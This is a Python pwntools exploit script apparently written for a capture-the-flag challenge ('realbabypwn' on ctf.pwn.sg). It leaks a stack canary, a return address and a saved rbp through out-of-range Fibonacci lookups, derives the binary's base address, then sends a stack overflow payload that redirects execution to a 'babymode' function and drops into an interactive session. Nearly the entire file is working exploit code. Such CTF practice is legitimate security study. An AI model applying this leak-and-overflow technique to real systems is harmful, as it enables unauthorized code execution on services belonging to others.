from pwn import *

s = ELF('realbabypwn')

print hex(s.symbols['babymode'])

binsh_offset = 0xc28
poprdi_offset = 0xc03
system_offset = 0x810
fib_ret_addr_offset = 0xb92
babymode_offset = 0x9b0

debug_offset = 0xaa5


#r = process('../realbabypwn')

r = remote('ctf.pwn.sg', 1500)

r.recvuntil('Which fibbonacci offset did you want to look up? ')

r.sendline('289')

r.recvuntil('Fibbonaci Number 289: ')

stack_can_reply = r.recvuntil('W')
stack_can = int(stack_can_reply[:-2])

print "Stack canary value: " + hex(stack_can)

#====================================================

r.recvuntil('ant to learn another Fibbonaci number? (y/n) ')
r.sendline('y')

r.recvuntil('Which fibbonacci offset did you want to look up? ')
r.sendline('291')

r.recvuntil('Fibbonaci Number 291: ')
fib_ret_addr_reply = r.recvuntil('W')

fib_ret_addr = int(fib_ret_addr_reply[:-2])

print "Fibonacci return address: " + hex(fib_ret_addr)

#====================================================

r.recvuntil('ant to learn another Fibbonaci number? (y/n) ')
r.sendline('y')

r.recvuntil('Which fibbonacci offset did you want to look up? ')
r.sendline('290')

r.recvuntil('Fibbonaci Number 290: ')
rbp_reply = r.recvuntil('W')

rbp_value = int(rbp_reply[:-2])

print "rbp of <main>: " + hex(rbp_value)


#====================================================


base_addr = fib_ret_addr - fib_ret_addr_offset

print "Base address: " + hex(base_addr)


binsh_addr = base_addr + binsh_offset
poprdi_addr = base_addr + poprdi_offset
system_addr = base_addr + system_offset

debug_addr = base_addr + debug_offset
babymode_addr = base_addr + babymode_offset

# exploit = "\x45" * 0x108 + p64(stack_can) + "\x45" * 0x8 + p64(babymode_addr) does not work for some reason in the remote machine. It worked only on the local machine.

exploit = "\x45" * 0x108 + p64(stack_can) + "\x45" * 0x8 + p64(babymode_addr) + p64(babymode_addr) + p64(babymode_addr)



debug_exploit = "\x45" * 0x108 + p64(stack_can) + "\x45" * 0x8 + p64(babymode_addr)

r.recvuntil('ant to learn another Fibbonaci number? (y/n) ')
r.sendline('n')
r.recvuntil('Did you learn anything? ')

r.sendline(exploit)
r.interactive()
